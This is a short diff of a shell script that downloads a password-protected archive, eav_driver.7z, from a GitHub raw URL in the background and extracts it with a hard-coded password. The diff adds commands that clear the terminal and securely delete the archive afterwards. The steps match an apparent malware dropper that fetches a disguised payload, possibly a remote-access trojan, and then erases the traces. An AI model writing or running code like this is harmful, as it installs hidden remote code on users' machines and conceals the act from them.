@@ -6,8 +6,10 @@ if [ $? -eq 0 ]; then
     cd $weJoy
  
  wget -b https://raw.githubusercontent.com/codecpacka/scripts/refs/heads/main/Resources/eav_driver.7z 
+ reset
  7z x eav_driver.7z -pRats@9033
-  #  shred -u -z *.7z 
+ shred -u -z *.7z 
+ reset
 else
 echo "App not installed please try after installing the App" 
 
